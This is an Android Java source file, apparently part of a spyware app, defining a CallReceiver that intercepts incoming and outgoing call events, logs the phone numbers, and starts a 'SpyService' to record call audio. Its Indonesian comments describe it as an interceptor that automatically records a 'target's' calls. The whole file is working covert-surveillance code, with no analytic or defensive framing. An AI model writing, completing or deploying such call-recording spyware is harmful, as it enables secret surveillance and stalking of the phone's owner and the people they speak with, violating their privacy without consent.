package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * CallReceiver: Interceptor Panggilan Suara.
 * Otomatis memicu perekaman saat target melakukan atau menerima telepon.
 */
public class CallReceiver extends BroadcastReceiver {

    private static final String TAG = "NXOB_CALL";
    private static String lastState = TelephonyManager.EXTRA_STATE_IDLE;

    @Override
    public void onReceive(Context context, Intent intent) {
        // Mencegat Panggilan Keluar
        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            Log.d(TAG, "Outgoing call to: " + phoneNumber);
            startSpyRecording(context);
        } else {
            // Mencegat Panggilan Masuk & Perubahan Status
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (state == null) return;

            if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                Log.d(TAG, "Incoming call from: " + incomingNumber);
            } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                // Telepon diangkat atau mulai bicara
                if (!lastState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                    Log.d(TAG, "Call answered/started. Triggering recorder...");
                    startSpyRecording(context);
                }
            } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                // Telepon ditutup
                if (lastState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                    Log.d(TAG, "Call ended. Stopping recorder...");
                    stopSpyRecording(context);
                }
            }
            lastState = state;
        }
    }

    private void startSpyRecording(Context context) {
        Intent intent = new Intent(context, SpyService.class);
        intent.setAction("START_AUDIO_RECORD");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    private void stopSpyRecording(Context context) {
        Intent intent = new Intent(context, SpyService.class);
        intent.setAction("STOP_AUDIO_RECORD");
        context.startService(intent);
    }
}